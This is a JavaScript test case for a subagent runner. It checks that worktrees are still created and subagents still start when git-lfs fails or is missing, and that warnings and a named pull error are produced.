test("(17b) if LFS fails in the worktree it arises anyway and the subagent starts (the file stays a pointer, the reason is in the log); without git-lfs the worktree stays intact, and gitPull with an instance throws \"git-lfs is missing\" — a repo without filter=lfs does not", async () => {
  await unit(async ({ o, inst }) => {
    const lfsLog = path.join(o.location, "lfs.jsonl");
    fakeLfs(o.bin, lfsLog);
    const OID = "e".repeat(64);
    const K = lfsRepo(o, "till", OID);

    // 1. LFS fails (a server that does not give the objects): the worktree stands, the subagent runs, the file is the pointer.
    lfsFails(lfsLog, "batch response: Repository or object not found\n");
    // The worktree is looked at DURING the run: an unchanged one goes away after the subagent ends (teardown job, like (1)).
    const real = (p) => String(p).split(o.location).join(fs.realpathSync(o.location)); // the log of git-lfs carries the real path
    let seen = null, wtExists = false;
    const tun = (spec) => { seen = fs.readFileSync(path.join(spec.cwd, "large.bin"), "utf8"); wtExists = fs.existsSync(path.join(spec.cwd, ".git")); };
    const including = core({ cwd: K, instance: "p1/main", gitFor: () => gitInProject(inst), worktreeRoot: path.join(o.location, "wt"), tun });
    await withWarnings(async (warnings) => {
      await including.rt.start(START);
      assert.equal(including.calls.length, 1, "the subagent did not start because LFS failed");
      assert.equal(seen, pointer(OID), "the file is not the pointer from before");
      assert.ok(wtExists, "the worktree did not stand during the run");
      assert.notEqual(path.resolve(including.calls[0].cwd), path.resolve(K), "the subagent ran in the main folder instead of the worktree");
      const pulls = lfsCalls(lfsLog).filter((a) => a.command === "pull");
      assert.deepEqual(pulls.map((a) => `${a.where} ${a.cwd === real(including.calls[0].cwd)}`), ["container true"], JSON.stringify(pulls));
      assert.ok(warnings.some((z) => z.includes("LFS in the worktree") && z.includes("Repository or object not found") && z.includes("stay pointers")),
        `the reason is missing in the log: ${JSON.stringify(warnings).slice(0, 400)}`);
    });
    lfsFails(lfsLog, null);

    // 2. Without git-lfs in the container (an older image): the worktree of a repo with filter=lfs arises with the pointer, without a throw.
    fs.rmSync(path.join(o.bin, "git-lfs"));
    const prior = lfsCalls(lfsLog).length;
    let seen2 = null, wtDa2 = false;
    const withoutLfs = core({ cwd: K, instance: "p1/main", gitFor: () => gitInProject(inst), worktreeRoot: path.join(o.location, "wt-2"),
      tun: (spec) => { seen2 = fs.readFileSync(path.join(spec.cwd, "large.bin"), "utf8"); wtDa2 = fs.existsSync(path.join(spec.cwd, ".git")); } });
    await withWarnings(async (warnings) => {
      await withoutLfs.rt.start(START);
      assert.equal(withoutLfs.calls.length, 1, "without git-lfs the subagent did not start");
      assert.equal(seen2, pointer(OID));
      assert.ok(wtDa2, "without git-lfs the worktree did not stand during the run");
      assert.ok(warnings.some((z) => z.includes("git-lfs is missing in the project container")), `without git-lfs no line: ${JSON.stringify(warnings).slice(0, 400)}`);
    });
    assert.equal(lfsCalls(lfsLog).length, prior, "the fake git-lfs ran although it is gone");
    assert.ok(has(o, "ls-files", "-z", "--", ":(attr:filter=lfs)"), "without git-lfs nobody asked for filter=lfs");

    // 3. gitPull with an instance in a repo with filter=lfs without git-lfs: the pull runs, then the named throw; the repo stays.
    const R = lfsRepo(o, "withlfs", OID, { remote: true });
    const headerPrior = realGit(R, ["rev-parse", "HEAD"], o.env);
    await assert.rejects(gitModule.gitPull(path.join(o.location, "proj"), "withlfs", null, { instance: inst }),
      (e) => /git-lfs fehlt im Projekt-Container/.test(String(e?.message)) && /Pull fertig/.test(String(e?.message)));
    assert.equal(realGit(R, ["rev-parse", "HEAD"], o.env), headerPrior, "the pull changed the state");
    assert.equal(fs.readFileSync(path.join(R, "large.bin"), "utf8"), pointer(OID), "the file is no longer the pointer");
    assert.equal(realGit(R, ["status", "--porcelain"], o.env), "", "the repo is not clean after the throw");
    // A repo without filter=lfs is finished without git-lfs: no throw (lfsFetch `ok` with `withoutLfs`).
    const L = path.join(o.location, "proj", "light");
    createRepo(L, o.env, { remote: path.join(o.location, "light-remote.git") });
    assert.deepEqual(await gitModule.gitPull(path.join(o.location, "proj"), "light", null, { instance: inst }), { ok: true });
    assert.deepEqual(inB(o), [], "no git in B");
    await including.rt.close?.();
    await withoutLfs.rt.close?.();
  });
});
